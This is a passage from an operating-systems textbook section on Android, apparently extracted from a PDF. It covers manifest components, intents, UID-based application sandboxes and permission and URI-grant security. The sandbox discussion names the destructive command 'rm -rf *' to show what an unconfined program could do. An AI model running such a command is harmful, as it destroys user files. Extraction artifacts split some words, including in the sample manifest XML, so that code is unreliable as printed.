storage\r\nwith a server even when the user is not currently in the application.\r\nAndroid applications do not have a simple main entry point which is executed\r\nwhen the user launches them. Instead, they publish under the manifest’s <applica\u0002tion> tag a variety of entry points describing the various things the application can\r\ndo. These entry points are expressed as four distinct types, defining the core types\r\nof behavior that applications can provide: activity, receiver, service, and content\r\nprovider. The example we have presented shows a few activities and one declara\u0002tion of the other component types, but an application may declare zero or more of\r\nany of these.\r\nEach of the different four component types an application can contain has dif\u0002ferent semantics and uses within the system. In all cases, the android:name attrib\u0002ute supplies the Java class name of the application code implementing that compo\u0002nent, which will be instantiated by the system when needed.\n826 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\r\npackage=\"com.example.email\">\r\n<application>\r\n<activity android:name=\"com.example.email.MailMainActivity\">\r\n<intent-filter>\r\n<action android:name=\"android.intent.action.MAIN\" />\r\n<categor y android:name=\"android.intent.categor y.LAUNCHER\" />\r\n</intent-filter>\r\n</activity>\r\n<activity android:name=\"com.example.email.ComposeActivity\">\r\n<intent-filter>\r\n<action android:name=\"android.intent.action.SEND\" />\r\n<categor y android:name=\"android.intent.categor y.DEFAULT\" />\r\n<data android:mimeType=\"*/*\" />\r\n</intent-filter>\r\n</activity>\r\n<ser vice android:name=\"com.example.email.SyncSer vice\">\r\n</ser vice>\r\n<receiver android:name=\"com.example.email.SyncControlReceiver\">\r\n<intent-filter>\r\n<action android:name=\"android.intent.action.DEVICE STORAGE LOW\" />\r\n</intent-filter>\r\n<intent-filter>\r\n<action android:name=\"android.intent.action.DEVICE STORAGE OKAY\" />\r\n</intent-filter>\r\n</receiver>\r\n<provider android:name=\"com.example.email.EmailProvider\"\r\nandroid:author ities=\"com.example.email.provider.email\">\r\n</provider>\r\n</application>\r\n</manifest>\r\nFigure 10-51. Basic structure of AndroidManifest.xml.\r\nThe package manager is the part of Android that keeps track of all application\r\npackages. It parses every application’s manifest, collecting and indexing the infor\u0002mation it finds in them. With that information, it then provides facilities for clients\r\nto query it about the currently installed applications and retrieve relevant infor\u0002mation about them. It is also responsible for installing applications (creating stor\u0002age space for the application and ensuring the integrity of the apk) as well as\r\nev erything needed to uninstall (cleaning up everything associated with a previously\r\ninstalled app).\nSEC. 10.8 ANDROID 827\r\nApplications statically declare their entry points in their manifest so they do\r\nnot need to execute code at install time that registers them with the system. This\r\ndesign makes the system more robust in many ways: installing an application does\r\nnot require running any application code, the top-level capabilities of the applica\u0002tion can always be determined by looking at the manifest, there is no need to keep\r\na separate database of this information about the application which can get out of\r\nsync (such as across updates) with the application’s actual capabilities, and it guar\u0002antees no information about an application can be left around after it is uninstalled.\r\nThis decentralized approach was taken to avoid many of these types of problems\r\ncaused by Windows’ centralized Registry.\r\nBreaking an application into finer-grained components also serves our design\r\ngoal of supporting interoperation and collaboration between applications. Applica\u0002tions can publish pieces of themselves that provide specific functionality, which\r\nother applications can make use of either directly or indirectly. This will be illus\u0002trated as we look in more detail at the four kinds of components that can be pub\u0002lished.\r\nAbove the package manager sits another important system service, the activity\r\nmanager. While the package manager is responsible for maintaining static infor\u0002mation about all installed applications, the activity manager determines when,\r\nwhere, and how those applications should run. Despite its name, it is actually\r\nresponsible for running all four types of application components and implementing\r\nthe appropriate behavior for each of them.\r\nActivities\r\nAn activity is a part of the application that interacts directly with the user\r\nthrough a user interface. When the user launches an application on their device,\r\nthis is actually an activity inside the application that has been designated as such a\r\nmain entry point. The application implements code in its activity that is responsi\u0002ble for interacting with the user.\r\nThe example email manifest shown in Fig. 10-51 contains two activities. The\r\nfirst is the main mail user interface, allowing users to view their messages; the sec\u0002ond is a separate interface for composing a new message. The first mail activity is\r\ndeclared as the main entry point for the application, that is, the activity that will be\r\nstarted when the user launches it from the home screen.\r\nSince the first activity is the main activity, it will be shown to users as an appli\u0002cation they can launch from the main application launcher. If they do so, the sys\u0002tem will be in the state shown in Fig. 10-52. Here the activity manager, on the left\r\nside, has made an internal ActivityRecord instance in its process to keep track of\r\nthe activity. One or more of these activities are organized into containers called\r\ntasks, which roughly correspond to what the user experiences as an application. At\r\nthis point the activity manager has started the email application’s process and an\r\ninstance of its MainMailActivity for displaying its main UI, which is associated\n828 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nwith the appropriate ActivityRecord. This activity is in a state called resumed since\r\nit is now in the foreground of the user interface.\r\nActivity manager in system_server process Email app process\r\nMailMainActivity Task: Email\r\nActivityRecord\r\n(MailMainActivity)\r\nRESUMED\r\nFigure 10-52. Starting an email application’s main activity.\r\nIf the user were now to switch away from the email application (not exiting it)\r\nand launch a camera application to take a picture, we would be in the state shown\r\nin Fig. 10-53. Note that we now hav e a new camera process running the camera’s\r\nmain activity, an associated ActivityRecord for it in the activity manager, and it is\r\nnow the resumed activity. Something interesting also happens to the previous\r\nemail activity: instead of being resumed, it is now stopped and the ActivityRecord\r\nholds this activity’s saved state.\r\nActivity manager in system_server process Camera app process\r\nEmail app process\r\nMailMainActivity\r\nCameraMainActivity Task: Camera\r\nActivityRecord\r\n(CameraMainActivity)\r\nActivityRecord\r\n(MailMainActivity)\r\nSTOPPED RESUMED\r\nSaved state\r\nTask: Email\r\nFigure 10-53. Starting the camera application after email.\r\nWhen an activity is no longer in the foreground, the system asks it to ‘‘save its\r\nstate.’’ This involves the application creating a minimal amount of state infor\u0002mation representing what the user currently sees, which it returns to the activity\nSEC. 10.8 ANDROID 829\r\nmanager and stores in the system server process, in the ActivityRecord associated\r\nwith that activity. The saved state for an activity is generally small, containing for\r\nexample where you are scrolled in an email message, but not the message itself,\r\nwhich will be stored elsewhere by the application in its persistent storage.\r\nRecall that although Android does demand paging (it can page in and out clean\r\nRAM that has been mapped from files on disk, such as code), it does not rely on\r\nswap space. This means all dirty RAM pages in an application’s process must stay\r\nin RAM. Having the email’s main activity state safely stored away in the activity\r\nmanager gives the system back some of the flexibility in dealing with memory that\r\nswap provides.\r\nFor example, if the camera application starts to require a lot of RAM, the sys\u0002tem can simply get rid of the email process, as shown in Fig. 10-54. The Activi\u0002tyRecord, with its precious saved state, remains safely tucked away by the activity\r\nmanager in the system server process. Since the system server process hosts all of\r\nAndroid’s core system services, it must always remain running, so the state saved\r\nhere will remain around for as long as we might need it.\r\nActivity manager in system_server process Camera app process\r\nCameraMainActivity Task: Camera\r\nActivityRecord\r\n(CameraMainActivity)\r\nActivityRecord\r\n(MailMainActivity)\r\nTask: Email\r\nSTOPPED RESUMED\r\nSaved state\r\nFigure 10-54. Removing the email process to reclaim RAM for the camera.\r\nOur example email application not only has an activity for its main UI, but in\u0002cludes another ComposeActivity. Applications can declare any number of activities\r\nthey want. This can help organize the implementation of an application, but more\r\nimportantly it can be used to implement cross-application interactions. For ex\u0002ample, this is the basis of Android’s cross-application sharing system, which the\r\nComposeActivity here is participating in. If the user, while in the camera applica\u0002tion, decides she wants to share a picture she took, our email application’s Com\u0002poseActivity is one of the sharing options she has. If it is selected, that activity will\n830 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nbe started and given the picture to be shared. (Later we will see how the camera\r\napplication is able to find the email application’s ComposeActivity.)\r\nPerforming that share option while in the activity state seen in Fig. 10-54 will\r\nlead to the new state in Fig. 10-55. There are a number of important things to note:\r\n1. The email app’s process must be started again, to run its ComposeAc\u0002tivity.\r\n2. However, the old MailMainActivity is not started at this point, since it\r\nis not needed. This reduces RAM use.\r\n3. The camera’s task now has two records: the original CameraMainAc\u0002tivity we had just been in, and the new ComposeActivity that is now\r\ndisplayed. To the user, these are still one cohesive task: it is the cam\u0002era currently interacting with them to email a picture.\r\n4. The new ComposeActivity is at the top, so it is resumed; the previous\r\nCameraMainActivity is no longer at the top, so its state has been\r\nsaved. We can at this point safely quit its process if its RAM is need\u0002ed elsewhere.\r\nActivity manager in system_server process Email app process\r\nActivityRecord\r\n(ComposeActivity)\r\nActivityRecord\r\n(CameraMainActivity)\r\nActivityRecord\r\n(MailMainActivity)\r\nSaved state\r\nSaved state\r\nSTOPPED STOPPED RESUMED\r\nTask: Camera ComposeActivity\r\nCameraMainActivity\r\nCamera app process\r\nTask: Email\r\nFigure 10-55. Sharing a camera picture through the email application.\r\nFinally let us look at would happen if the user left the camera task while in this\r\nlast state (that is, composing an email to share a picture) and returned to the email\nSEC. 10.8 ANDROID 831\r\napplication. Figure 10-56 shows the new state the system will be in. Note that we\r\nhave brought the email task with its main activity back to the foreground. This\r\nmakes MailMainActivity the foreground activity, but there is currently no instance\r\nof it running in the application’s process.\r\nActivity manager in system_server process Email app process\r\nCamera app process\r\nMailMainActivity\r\nComposeActivity\r\nCameraMainActivity\r\nSaved state\r\nSaved state\r\nSTOPPED STOPPED RESUMED\r\nTask: Email\r\nTask: Camera\r\nActivityRecord\r\n(MailMainActivity)\r\nActivityRecord\r\n(ComposeActivity)\r\nActivityRecord\r\n(CameraMainActivity)\r\nFigure 10-56. Returning to the email application.\r\nTo return to the previous activity, the system makes a new instance, handing it\r\nback the previously saved state the old instance had provided. This action of\r\nrestoring an activity from its saved state must be able to bring the activity back to\r\nthe same visual state as the user last left it. To accomplish this, the application will\r\nlook in its saved state for the message the user was in, load that message’s data\r\nfrom its persistent storage, and then apply any scroll position or other user-inter\u0002face state that had been saved.\r\nServices\r\nA service has two distinct identities:\r\n1. It can be a self-contained long-running background operation. Com\u0002mon examples of using services in this way are performing back\u0002ground music playback, maintaining an active network connection\r\n(such as with an IRC server) while the user is in other applications,\r\ndownloading or uploading data in the background, etc.\n832 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n2. It can serve as a connection point for other applications or the system\r\nto perform rich interaction with the application. This can be used by\r\napplications to provide secure APIs for other applications, such as to\r\nperform image or audio processing, provide a text to speech, etc.\r\nThe example email manifest shown in Fig. 10-51 contains a service that is used\r\nto perform synchronization of the user’s mailbox. A common implementation\r\nwould schedule the service to run at a regular interval, such as every 15 minutes,\r\nstarting the service when it is time to run, and stopping itself when done.\r\nThis is a typical use of the first style of service, a long-running background op\u0002eration. Figure 10-57 shows the state of the system in this case, which is quite\r\nsimple. The activity manager has created a ServiceRecord to keep track of the ser\u0002vice, noting that it has been started, and thus created its SyncService instance in the\r\napplication’s process. While in this state the service is fully active (barring the en\u0002tire system going to sleep if not holding a wake lock) and free to do what it wants.\r\nIt is possible for the application’s process to go away while in this state, such as if\r\nthe process crashes, but the activity manager will continue to maintain its Ser\u0002viceRecord and can at that point decide to restart the service if desired.\r\nActivity manager in system_server process Email app process\r\nSyncService ServiceRecord\r\n(SyncService)\r\nSTARTED\r\nFigure 10-57. Starting an application service.\r\nTo see how one can use a service as a connection point for interaction with\r\nother applications, let us say that we want to extend our existing SyncService to\r\nhave an API that allows other applications to control its sync interval. We will\r\nneed to define an AIDL interface for this API, like the one shown in Fig. 10-58.\r\npackage com.example.email\r\ninterface ISyncControl {\r\nint getSyncInterval();\r\nvoid setSyncInterval(int seconds);\r\n}\r\nFigure 10-58. Interface for controlling a sync service’s sync interval.\r\nTo use this, another process can bind to our application service, getting access\r\nto its interface. This creates a connection between the two applications, shown in\r\nFig. 10-59. The steps of this process are:\nSEC. 10.8 ANDROID 833\r\n1. The client application tells the activity manager that it would like to\r\nbind to the service.\r\n2. If the service is not already created, the activity manager creates it in\r\nthe service application’s process.\r\n3. The service returns the IBinder for its interface back to the activity\r\nmanager, which now holds that IBinder in its ServiceRecord.\r\n4. Now that the activity manager has the service IBinder, it can be sent\r\nback to the original client application.\r\n5. The client application now having the service’s IBinder may proceed\r\nto make any direct calls it would like on its interface.\r\nActivity manager in system_server process Email app process\r\n2. Create\r\n3. Return\r\n4. Send\r\n1. Bind\r\nClient app process\r\n5. Call service\r\nSyncService\r\nIBinder IBinder\r\nIBinder\r\nIBinder\r\nIBinder\r\nServiceRecord\r\n(SyncService)\r\nSTOPPED\r\nFigure 10-59. Binding to an application service.\r\nReceivers\r\nA receiver is the recipient of (typically external) events that happen, generally\r\nin the background and outside of normal user interaction. Receivers conceptually\r\nare the same as an application explicitly registering for a callback when something\r\ninteresting happens (an alarm goes off, data connectivity changes, etc), but do not\r\nrequire that the application be running in order to receive the event.\r\nThe example email manifest shown in Fig. 10-51 contains a receiver for the\r\napplication to find out when the device’s storage becomes low in order for it to\r\nstop synchronizing email (which may consume more storage). When the device’s\r\nstorage becomes low, the system will send a broadcast with the low storage code,\r\nto be delivered to all receivers interested in the event.\r\nFigure 10-60 illustrates how such a broadcast is processed by the activity man\u0002ager in order to deliver it to interested receivers. It first asks the package manager\n834 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nfor a list of all receivers interested in the event, which is placed in a Broadcast\u0002Record representing that broadcast. The activity manager will then proceed to step\r\nthrough each entry in the list, having each associated application’s process create\r\nand execute the appropriate receiver class.\r\nActivity manager in system_server process Calendar app process\r\nEmail app process\r\nBrowser app process\r\nSyncControlReceiver\r\nSyncControlReceiver\r\nCleanupReceiver\r\nBroadcastRecord\r\nDEVICE_STORAGE_LOW\r\nSyncControlReceiver\r\n(Calendar app)\r\nSyncControlReceiver\r\n(Email app)\r\nCleanupReceiver\r\n(Browser app)\r\nFigure 10-60. Sending a broadcast to application receivers.\r\nReceivers only run as one-shot operations. When an event happens, the system\r\nfinds any receivers interested in it, delivers that event to them, and once they hav e\r\nconsumed the event they are done. There is no ReceiverRecord like those we have\r\nseen for other application components, because a particular receiver is only a tran\u0002sient entity for the duration of a single broadcast. Each time a new broadcast is\r\nsent to a receiver component, a new instance of that receiver’s class is created.\r\nContent Providers\r\nOur last application component, the content provider, is the primary mechan\u0002ism that applications use to exchange data with each other. All interactions with a\r\ncontent provider are through URIs using a content: scheme; the authority of the\r\nURI is used to find the correct content-provider implementation to interact with.\r\nFor example, in our email application from Fig. 10-51, the content provider\r\nspecifies that its authority is com.example.email.provider.email. Thus URIs operat\u0002ing on this content provider would start with\r\ncontent://com.example.email.provider.email/\r\nThe suffix to that URI is interpreted by the provider itself to determine which data\r\nwithin it is being accessed. In the example here, a common convention would be\r\nthat the URI\nSEC. 10.8 ANDROID 835\r\ncontent://com.example.email.provider.email/messages\r\nmeans the list of all email messages, while\r\ncontent://com.example.email.provider.email/messages/1\r\nprovides access to a single message at key number 1.\r\nTo interact with a content provider, applications always go through a system\r\nAPI called ContentResolver, where most methods have an initial URI argument\r\nindicating the data to operate on. One of the most often used ContentResolver\r\nmethods is query, which performs a database query on a given URI and returns a\r\nCursor for retrieving the structured results. For example, retrieving a summary of\r\nall of the available email messages would look something like:\r\nquer y(\"content://com.example.email.provider.email/messages\")\r\nThough this does not look like it to applications, what is actually going on\r\nwhen they use content providers has many similarities to binding to services. Fig\u0002ure 10-61 illustrates how the system handles our query example:\r\n1. The application calls ContentResolver.query to initiate the operation.\r\n2. The URI’s authority is handed to the activity manager for it to find\r\n(via the package manager) the appropriate content provider.\r\n3. If the content provider is not already running, it is created.\r\n4. Once created, the content provider returns to the activity manager its\r\nIBinder implementing the system’s IContentProvider interface.\r\n5. The content provider’s Binder is returned to the ContentResolver.\r\n6. The content resolver can now complete the initial query operation by\r\ncalling the appropriate method on the AIDL interface, returning the\r\nCursor result.\r\nContent providers are one of the key mechanisms for performing interactions\r\nacross applications. For example, if we return to the cross-application sharing sys\u0002tem previously described in Fig. 10-55, content providers are the way data is ac\u0002tually transferred. The full flow for this operation is:\r\n1. A share request that includes the URI of the data to be shared is creat\u0002ed and is submitted to the system.\r\n2. The system asks the ContentResolver for the MIME type of the data\r\nbehind that URI; this works much like the query method we just dis\u0002cussed, but asks the content provider to return a MIME-type string for\r\nthe URI.\n836 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nActivity manager in system_server process Email app process\r\nProviderRecord\r\n(EmailProvider) EmailProvider\r\nContentResolver\r\n1. query()\r\nClient app process\r\n3. Create\r\nIBinder IContentProvider.Stub\r\nIContentProvider.Proxy\r\n4. Return\r\n5. Return\r\n2. Look up\r\n Authority\r\nIBinder\r\nIBinder\r\n6. query()\r\nFigure 10-61. Interacting with a content provider.\r\n3. The system finds all activities that can receive data of the identified\r\nMIME type.\r\n4. A user interface is shown for the user to select one of the possible re\u0002cipients.\r\n5. When one of these activities is selected, the system launches it.\r\n6. The share-handling activity receives the URI of the data to be shared,\r\nretrieves its data through ContentResolver, and performs its ap\u0002propriate operation: creates an email, stores it, etc.."
          },
          "10.8.9 Intents": {
            "page": 867,
            "content": "10.8.9 Intents\r\nA detail that we have not yet discussed in the application manifest shown in\r\nFig. 10-51 is the <intent-filter> tags included with the activities and receiver decla\u0002rations. This is part of the intent feature in Android, which is the cornerstone for\r\nhow different applications identify each other in order to be able to interact and\r\nwork together.\r\nAn intent is the mechanism Android uses to discover and identify activities,\r\nreceivers, and services. It is similar in some ways to the Linux shell’s search path,\r\nwhich the shell uses to look through multiple possible directories in order to find\r\nan executable matching command names given to it.\r\nThere are two major types of intents: explicit and implicit. An explicit intent\r\nis one that directly identifies a single specific application component; in Linux\r\nshell terms it is the equivalent to supplying an absolute path to a command. The\nSEC. 10.8 ANDROID 837\r\nmost important part of such an intent is a pair of strings naming the component: the\r\npackage name of the target application and class name of the component within\r\nthat application. Now referring back to the activity of Fig. 10-52 in application\r\nFig. 10-51, an explicit intent for this component would be one with package name\r\ncom.example.email and class name com.example.email.MailMainActivity.\r\nThe package and class name of an explicit intent are enough information to\r\nuniquely identify a target component, such as the main email activity in Fig. 10-52.\r\nFrom the package name, the package manager can return everything needed about\r\nthe application, such as where to find its code. From the class name, we know\r\nwhich part of that code to execute.\r\nAn implicit intent is one that describes characteristics of the desired compo\u0002nent, but not the component itself; in Linux shell terms this is the equivalent to\r\nsupplying a single command name to the shell, which it uses with its search path to\r\nfind a concrete command to be run. This process of finding the component match\u0002ing an implicit intent is called intent resolution.\r\nAndroid’s general sharing facility, as we previously saw in Fig. 10-55’s illus\u0002tration of sharing a photo the user took from the camera through the email applica\u0002tion, is a good example of implicit intents. Here the camera application builds an\r\nintent describing the action to be done, and the system finds all activities that can\r\npotentially perform that action. A share is requested through the intent action\r\nandroid.intent.action.SEND, and we can see in Fig. 10-51 that the email applica\u0002tion’s compose activity declares that it can perform this action.\r\nThere can be three outcomes to an intent resolution: (1) no match is found, (2)\r\na single unique match is found, or (3) there are multiple activities that can handle\r\nthe intent. An empty match will result in either an empty result or an exception,\r\ndepending on the expectations of the caller at that point. If the match is unique,\r\nthen the system can immediately proceed to launching the now explicit intent. If\r\nthe match is not unique, we need to somehow resolve it in another way to a single\r\nresult.\r\nIf the intent resolves to multiple possible activities, we cannot just launch all of\r\nthem; we need to pick a single one to be launched. This is accomplished through a\r\ntrick in the package manager. If the package manager is asked to resolve an intent\r\ndown to a single activity, but it finds there are multiple matches, it instead resolves\r\nthe intent to a special activity built into the system called the ResolverActivity.\r\nThis activity, when launched, simply takes the original intent, asks the package\r\nmanager for a list of all matching activities, and displays these for the user to select\r\na single desired action. When one is selected, it creates a new explicit intent from\r\nthe original intent and the selected activity, calling the system to have that new\r\nactivity started.\r\nAndroid has another similarity with the Linux shell: Android’s graphical shell,\r\nthe launcher, runs in user space like any other application. An Android launcher\r\nperforms calls on the package manager to find the available activities and launch\r\nthem when selected by the user.\n838 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10"
          },
          "10.8.10 Application Sandboxes": {
            "page": 869,
            "content": "10.8.10 Application Sandboxes\r\nTraditionally in operating systems, applications are seen as code executing as\r\nthe user, on the user’s behalf. This behavior has been inherited from the command\r\nline, where you run the ls command and expect that to run as your identity (UID),\r\nwith the same access rights as you have on the system. In the same way, when you\r\nuse a graphical user interface to launch a game you want to play, that game will ef\u0002fectively run as your identity, with access to your files and many other things it\r\nmay not actually need.\r\nThis is not, however, how we mostly use computers today. We run applica\u0002tions we acquired from some less trusted third-party source, that have sweeping\r\nfunctionality, which will do a wide variety of things in their environment that we\r\nhave little control over. There is a disconnect between the application model sup\u0002ported by the operating system and the one actually in use. This may be mitigated\r\nby strategies such as distinguishing between normal and ‘‘admin’’ user privileges\r\nand warning the first time they are running an application, but those do not really\r\naddress the underlying disconnect.\r\nIn other words, traditional operating systems are very good at protecting users\r\nfrom other users, but not in protecting users from themselves. All programs run\r\nwith the power of the user and, if any of them misbehaves, it can do all the damage\r\nthe user can do. Think about it: how much damage could you do in, say, a UNIX\r\nenvironment? You could leak all information accessible to the user. You could\r\nperform rm -rf * to give yourself a nice, empty home directory. And if the program\r\nis not just buggy, but also malicious, it could encrypt all your files for ransom.\r\nRunning everything with ‘‘the power of you’’ is dangerous!\r\nAndroid attempts to address this with a core premise: that an application is ac\u0002tually the developer of that application running as a guest on the user’s device.\r\nThus an application is not trusted with anything sensitive that is not explicitly\r\napproved by the user.\r\nIn Android’s implementation, this philosophy is rather directly expressed\r\nthrough user IDs. When an Android application is installed, a new unique Linux\r\nuser ID (or UID) is created for it, and all of its code runs as that ‘‘user.’’ Linux user\r\nIDs thus create a sandbox for each application, with their own isolated area of the\r\nfile system, just as they create sandboxes for users on a desktop system. In other\r\nwords, Android uses an existing feature in Linux, but in a novel way. The result is\r\nbetter isolation."
          },
          "10.8.11 Security": {
            "page": 869,
            "content": "10.8.11 Security\r\nApplication security in Android revolves around UIDs. In Linux, each process\r\nruns as a specific UID, and Android uses the UID to identify and protect security\r\nbarriers. The only way to interact across processes is through some IPC mechan\u0002ism, which generally carries with it enough information to identify the UID of the\nSEC. 10.8 ANDROID 839\r\ncaller. Binder IPC explicitly includes this information in every transaction deliv\u0002ered across processes so a recipient of the IPC can easily ask for the UID of the\r\ncaller.\r\nAndroid predefines a number of standard UIDs for the lower-level parts of the\r\nsystem, but most applications are dynamically assigned a UID, at first boot or in\u0002stall time, from a range of ‘‘application UIDs.’’ Figure 10-62 illustrates some com\u0002mon mappings of UID values to their meanings. UIDs below 10000 are fixed\r\nassignments within the system for dedicated hardware or other specific parts of the\r\nimplementation; some typical values in this range are shown here. In the range\r\n10000–19999 are UIDs dynamically assigned to applications by the package man\u0002ager when it installs them; this means at most 10,000 applications can be installed\r\non the system. Also note the range starting at 100000, which is used to implement\r\na traditional multiuser model for Android: an application that is granted UID\r\n10002 as its identity would be identified as 110002 when running as a second user.\r\nUID Purpose\r\n0 Root\r\n1000 Core system (system ser ver process)\r\n1001 Telephony ser vices\r\n1013 Low-level media processes\r\n2000 Command line shell access\r\n10000–19999 Dynamically assigned application UIDs\r\n100000 Start of secondar y users\r\nFigure 10-62. Common UID assignments in Android\r\nWhen an application is first assigned a UID, a new storage directory is created\r\nfor it, with the files there owned by its UID. The application gets free access to its\r\nprivate files there, but cannot access the files of other applications, nor can the\r\nother applications touch its own files. This makes content providers, as discussed\r\nin the earlier section on applications, especially important, as they are one of the\r\nfew mechanisms that can transfer data between applications.\r\nEven the system itself, running as UID 1000, cannot touch the files of applica\u0002tions. This is why the installd daemon exists: it runs with special privileges to be\r\nable to access and create files and directories for other applications. There is a\r\nvery restricted API installd provides to the package manager for it to create and\r\nmanage the data directories of applications as needed.\r\nIn their base state, Android’s application sandboxes must disallow any\r\ncross-application interactions that can violate security between them. This may be\r\nfor robustness (preventing one app from crashing another app), but most often it is\r\nabout information access.\r\nConsider our camera application. When the user takes a picture, the camera\r\napplication stores that picture in its private data space. No other applications can\n840 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\naccess that data, which is what we want since the pictures there may be sensitive\r\ndata to the user.\r\nAfter the user has taken a picture, she may want to email it to a friend. Email\r\nis a separate application, in its own sandbox, with no access to the pictures in the\r\ncamera application. How can the email application get access to the pictures in the\r\ncamera application’s sandbox?\r\nThe best-known form of access control in Android is application permissions.\r\nPermissions are specific well-defined abilities that can be granted to an application\r\nat install time. The application lists the permissions it needs in its manifest, and\r\nprior to installing the application the user is informed of what it will be allowed to\r\ndo based on them.\r\nFigure 10-63 shows how our email application could make use of permissions\r\nto access pictures in the camera application. In this case, the camera application\r\nhas associated the READ PICTURES permission with its pictures, saying that any\r\napplication holding that permission can access its picture data. The email applica\u0002tion declares in its manifest that it requires this permission. The email application\r\ncan now access a URI owned by the camera, such as content://pics/1; upon receiv\u0002ing the request for this URI, the camera app’s content provider asks the package\r\nmanager whether the caller holds the necessary permission. If it does, the call suc\u0002ceeds and appropriate data is returned to the application.\r\nPackage manager in system_server process\r\nCamera app process\r\nPicturesProvider\r\nAuthority: \"pics\"\r\nComposeActivity\r\nEmail app process\r\nReceive\r\ndata\r\nOpen\r\ncontent://pics/1\r\nCheck\r\nAllow\r\nEmail package UID\r\nGranted permissions\r\nREAD_CONTACTS\r\nREAD_PICTURES\r\nINTERNET\r\nBrowser package UID\r\nGranted permissions\r\nINTERNET\r\nFigure 10-63. Requesting and using a permission.\r\nPermissions are not tied to content providers; any IPC into the system may be\r\nprotected by a permission through the system’s asking the package manager if the\r\ncaller holds the required permission. Recall that application sandboxing is based\nSEC. 10.8 ANDROID 841\r\non processes and UIDs, so a security barrier always happens at a process boundary,\r\nand permissions themselves are associated with UIDs. Given this, a permission\r\ncheck can be performed by retrieving the UID associated with the incoming IPC\r\nand asking the package manager whether that UID has been granted the correspon\u0002ding permission. For example, permissions for accessing the user’s location are\r\nenforced by the system’s location manager service when applications call in to it.\r\nFigure 10-64 illustrates what happens when an application does not hold a per\u0002mission needed for an operation it is performing. Here the browser application is\r\ntrying to directly access the user’s pictures, but the only permission it holds is one\r\nfor network operations over the Internet. In this case the PicturesProvider is told\r\nby the package manager that the calling process does not hold the needed\r\nREAD PICTURES permission, and as a result throws a SecurityException back to\r\nit.\r\nPackage manager in system_server process\r\nCamera app process\r\nPicturesProvider\r\nAuthority: \"pics\"\r\nSecurity\r\nexception\r\nOpen\r\ncontent://pics/1\r\nCheck\r\nBrowser app process\r\nBrowserMainActivity\r\nDeny\r\nEmail package UID\r\nGranted permissions\r\nREAD_CONTACTS\r\nREAD_PICTURES\r\nINTERNET\r\nBrowser package UID\r\nGranted permissions\r\nINTERNET\r\nFigure 10-64. Accessing data without a permission.\r\nPermissions provide broad, unrestricted access to classes of operations and\r\ndata. They work well when an application’s functionality is centered around those\r\noperations, such as our email application requiring the INTERNET permission to\r\nsend and receive email. However, does it make sense for the email application to\r\nhold a READ PICTURES permission? There is nothing about an email application\r\nthat is directly related to reading your pictures, and no reason for an email applica\u0002tion to have access to all of your pictures.\r\nThere is another issue with this use of permissions, which we can see by re\u0002turning to Fig. 10-55. Recall how we can launch the email application’s Com\u0002poseActivity to share a picture from the camera application. The email application\n842 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nreceives a URI of the data to share, but does not know where it came from—in the\r\nfigure here it comes from the camera, but any other application could use this to let\r\nthe user email its data, from audio files to word-processing documents. The email\r\napplication only needs to read that URI as a byte stream to add it as an attachment.\r\nHowever, with permissions it would also have to specify up-front the permissions\r\nfor all of the data of all of the applications it may be asked to send an email from.\r\nWe hav e two problems to solve. First, we do not want to give applications ac\u0002cess to wide swaths of data that they do not really need. Second, they need to be\r\ngiven access to any data sources, even ones they do not have a priori knowledge\r\nabout.\r\nThere is an important observation to make: the act of emailing a picture is ac\u0002tually a user interaction where the user has expressed a clear intent to use a specific\r\npicture with a specific application. As long as the operating system is involved in\r\nthe interaction, it can use this to identify a specific hole to open in the sandboxes\r\nbetween the two applications, allowing that data through.\r\nAndroid supports this kind of implicit secure data access through intents and\r\ncontent providers. Figure 10-65 illustrates how this situation works for our picture\r\nemailing example. The camera application at the bottom-left has created an intent\r\nasking to share one of its images, content://pics/1. In addition to starting the email\r\ncompose application as we had seen before, this also adds an entry to a list of\r\n‘‘granted URIs,’’ noting that the new ComposeActivity now has access to this URI.\r\nNow when ComposeActivity looks to open and read the data from the URI it has\r\nbeen given, the camera application’s PicturesProvider that owns the data behind the\r\nURI can ask the activity manager if the calling email application has access to the\r\ndata, which it does, so the picture is returned.\r\nThis fine-grained URI access control can also operate the other way. There is\r\nanother intent action, android.intent.action.GET CONTENT, which an application\r\ncan use to ask the user to pick some data and return to it. This would be used in\r\nour email application, for example, to operate the other way around: the user while\r\nin the email application can ask to add an attachment, which will launch an activity\r\nin the camera application for them to select one.\r\nFigure 10-66 illustrates this new flow. It is almost identical to Fig. 10-65, the\r\nonly difference being in the way the activities of the two applications are com\u0002posed, with the email application starting the appropriate picture-selection activity\r\nin the camera application. Once an image is selected, its URI is returned back to\r\nthe email application, and at this point our URI grant is recorded by the activity\r\nmanager.\r\nThis approach is extremely powerful, since it allows the system to maintain\r\ntight control over per-application data, granting specific access to data where need\u0002ed, without the user needing to be aware that this is happening. Many other user\r\ninteractions can also benefit from it. An obvious one is drag and drop to create a\r\nsimilar URI grant, but Android also takes advantage of other information such as\r\ncurrent window focus to determine the kinds of interactions applications can have.\nSEC. 10.8 ANDROID 843\r\nActivity manager in system_server process Camera app process\r\nGranted URIs\r\nTask: Pictures\r\nSEND\r\ncontent://pics/1\r\nSTOPPED RESUMED\r\nSaved state\r\nActivityRecord\r\n(ComposeActivity)\r\nActivityRecord\r\n(CameraActivity)\r\nTo: ComposeActivity\r\nURI: content://pics/1\r\nAllow\r\nCheck\r\nPicturesProvider\r\nAuthority: \"pics\"\r\nComposeActivity\r\nEmail app process\r\nOpen\r\ncontent://pics/1\r\nReceive\r\ndata\r\nFigure 10-65. Sharing a picture using a content provider.\r\nA final common security method Android uses is explicit user interfaces for al\u0002lowing/removing specific types of access. In this approach, there is some way an\r\napplication indicates it can optionally provide some functionally, and a sys\u0002tem-supplied trusted user interface that provides control over this access.\r\nA typical example of this approach is Android’s input-method architecture.\r\nAn input method is a specific service supplied by a third-party application that al\u0002lows the user to provide input to applications, typically in the form of an on-screen\r\nkeyboard. This is a highly sensitive interaction in the system, since a lot of 